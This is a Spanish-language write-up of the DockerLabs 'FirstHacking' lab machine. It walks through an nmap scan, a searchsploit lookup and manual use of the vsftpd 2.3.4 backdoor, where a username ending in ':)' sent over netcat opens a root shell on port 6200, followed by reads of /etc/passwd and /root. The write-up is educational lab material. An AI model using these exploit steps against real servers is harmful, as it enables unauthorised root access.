# DockerLabs — FirstHacking | Writeup

> Writeup de la máquina **FirstHacking** de la plataforma [DockerLabs](https://dockerlabs.es).
> Autor: **Dani (naanii021)** · Dificultad: **Muy Fácil**

---

## 🗺️ Resumen

| Campo | Valor |
|---|---|
| **Plataforma** | DockerLabs |
| **Máquina** | FirstHacking |
| **Dificultad** | Muy Fácil |
| **IP objetivo** | `172.17.0.2` |
| **Técnicas clave** | Enumeración de servicios · Identificación de versión · Backdoor vsftpd 2.3.4 |
| **Objetivo** | Conseguir acceso como `root` |

---

## 🚀 Despliegue de la máquina

La máquina se despliega localmente mediante el script `auto_deploy.sh` que incluye DockerLabs:

```bash
unzip firsthacking.zip
sudo bash auto_deploy.sh firsthacking.tar
```

Salida del despliegue:

```
Máquina desplegada, su dirección IP es --> 172.17.0.2
```

---

## 🔍 Fase 1 — Reconocimiento y enumeración

Lanzamos un escaneo completo de puertos con detección de versiones:

```bash
nmap -p- --open -sV -n -Pn 172.17.0.2
```

**Parámetros utilizados:**

- `-p-` → escanea los 65535 puertos.
- `--open` → muestra únicamente los puertos abiertos.
- `-sV` → detecta el servicio y su versión.
- `-n` → desactiva la resolución DNS (más rápido).
- `-Pn` → omite el ping previo (asume el host activo).

**Resultado:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```

Un único puerto abierto: **FTP (21)** corriendo **vsftpd 2.3.4**.

---

## 🧠 Fase 2 — Investigación de la vulnerabilidad

Al identificar una versión concreta de un servicio, el siguiente paso es comprobar si tiene vulnerabilidades conocidas. Usamos `searchsploit`:

```bash
searchsploit vsftpd 2.3.4
```

Aparecen dos exploits para esta versión, ambos referentes a un **backdoor (puerta trasera)**.

### Contexto del fallo

En 2011 el servidor de distribución de **vsftpd** fue comprometido y se inyectó código malicioso en la versión **2.3.4**. Dicho código abre una puerta trasera: cuando un usuario de login contiene la secuencia **`:)`** (una carita sonriente), el servidor abre una **shell oculta en el puerto `6200`**.

---

## 💥 Fase 3 — Explotación (manual)

### Paso 1 — Disparar el backdoor

Nos conectamos al puerto FTP con `netcat` y enviamos un usuario que termine en `:)`:

```bash
nc 172.17.0.2 21
```

```
220 (vsFTPd 2.3.4)
USER hacker:)
331 Please specify the password.
PASS cualquiercosa
```

> ⚠️ En FTP cada orden debe ir precedida de su palabra clave (`USER` / `PASS`). La contraseña es irrelevante: lo que activa el backdoor es la carita `:)` en el usuario.

Tras enviar la contraseña, la conexión se queda "colgada". Esto es **señal de éxito**: el backdoor ya está escuchando en el puerto `6200`.

### Paso 2 — Conectarse a la shell oculta

Desde una segunda terminal, nos conectamos al puerto del backdoor:

```bash
nc 172.17.0.2 6200
```

Comprobamos el usuario con el que entramos:

```bash
whoami
# root
id
# uid=0(root) gid=0(root) groups=0(root)
```

🩸 **Acceso como `root` conseguido.**

---

## 🏴 Fase 4 — Post-explotación

Enumeración de usuarios del sistema:

```bash
cat /etc/passwd
```

Solo `root` dispone de una shell válida (`/bin/bash`); el resto son cuentas de servicio (`/usr/sbin/nologin`).

Revisión del directorio de root:

```bash
ls -la /root
```

No existe archivo de flag: en esta máquina el objetivo era directamente la obtención de `root`, ya cumplido.

---

## 🧹 Limpieza

Para eliminar el contenedor al terminar, se pulsa `Ctrl+C` en la terminal donde se ejecutó `auto_deploy.sh`.

---

## ✅ Conclusión

FirstHacking es una máquina introductoria ideal para asimilar el **ciclo básico de un pentest**:

1. **Reconocimiento** → `nmap` localiza el servicio y su versión.
2. **Investigación** → `searchsploit` revela la vulnerabilidad asociada.
3. **Explotación** → se abusa del backdoor de vsftpd 2.3.4 de forma manual.
4. **Acceso root** → control total del sistema.

Una lección clave: **la versión de un servicio es información crítica**. Identificarla es, muchas veces, el primer paso hacia el compromiso del sistema.

---

> 📌 *Writeup realizado con fines educativos en un entorno de laboratorio controlado.*
